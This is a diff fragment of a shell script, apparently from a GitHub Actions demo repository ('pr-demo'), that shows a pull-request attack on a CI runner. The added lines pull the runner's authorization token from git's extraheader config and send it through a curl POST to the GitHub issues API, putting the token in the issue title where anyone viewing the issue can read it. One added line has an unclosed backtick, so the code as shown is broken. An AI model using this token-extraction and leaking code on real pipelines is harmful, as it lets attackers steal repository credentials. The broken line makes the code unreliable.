@@ -160,14 +160,15 @@ echo We have access to the file system!
 # done
 
 git config --list
-GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -d' ' -f3 | base64` > foo.out
+GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -d' ' -f3 
+GIT_REPO=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get remote.origin.url`
 curl --request POST \
-          --url https://api.github.com/repos/${{ github.repository }}/issues \
+          --url https://api.github.com/repos/$GIT_REPO/issues \
           --header 'authorization: Bearer $GIT_VALUES' \
           --header 'content-type: application/json' \
           --data '{
             "title": "Automated issue for commit $GIT_VALUES",
-            "body": "This issue was automatically created by the GitHub Action workflow **${{ github.workflow }}**. \n\n The commit hash was: _${{ github.sha }}_."
+            "body": "This issue was automatically created by the GitHub Action workflow"
             }' \
           --fail
 git config user.name test
